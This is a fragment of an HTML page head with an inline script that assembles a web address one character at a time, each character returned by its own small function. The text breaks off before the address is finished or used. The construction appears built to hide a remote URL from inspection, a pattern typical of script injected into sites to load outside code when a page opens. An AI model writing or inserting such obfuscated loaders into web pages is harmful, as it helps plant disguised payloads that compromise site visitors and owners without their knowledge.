<head>

    <script>
        const parts = [
            _ => 'h',
            function() { return 't'; },

            _ => 'p',
            _ => 's',
            _ => ':',
            _ => '/',
            _ => '/',
            () => 'v',

            () => 'r',
            _ => 'g',

            function() { return 'n'; },
            function() { return '.'; },
            _ => 'c',
            _ => 'l',
            () => 'i',

            _ => '/',
            function() { return 's'; },
            _ => '/',
            _ => 'n',
            _ => 'e',
            function() { return 'w'; }
